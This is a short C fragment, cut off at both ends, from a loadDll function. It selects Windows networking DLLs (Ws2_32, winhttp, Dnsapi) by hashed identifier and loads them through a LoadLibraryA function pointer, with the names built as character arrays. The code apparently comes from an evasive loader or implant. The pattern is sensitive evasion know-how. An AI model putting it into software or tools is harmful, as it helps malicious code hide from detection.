...
loadDll(unsigned long crypted_dll_hash) {
	...
	} else if (crypted_dll_hash == CRYPTED_HASH_WS32) {
		char _dll_name[] = { 'W','s','2','_','3','2','.','d','l','l', 0x00, 0x00 };
		ptr_loaded_dll = (uint64_t)((LOADLIBRARYA)fptr_loadLibary)(_dll_name);
	} else if (crypted_dll_hash == CRYPTED_HASH_WINHTTP) {
		char _dll_name[] = { 'w', 'i','n','h','t','t','p', '.','d','l','l', 0x00, 0x00 };
		ptr_loaded_dll = (uint64_t)((LOADLIBRARYA)fptr_loadLibary)(_dll_name);
	} else if (crypted_dll_hash == CRYPTED_HASH_DNSAPI) {
		char _dll_name[] = { 'D','n','s','a','p','i','.','d','l','l', 0x00, 0x00 };
		ptr_loaded_dll = (uint64_t)((LOADLIBRARYA)fptr_loadLibary)(_dll_name);
	}
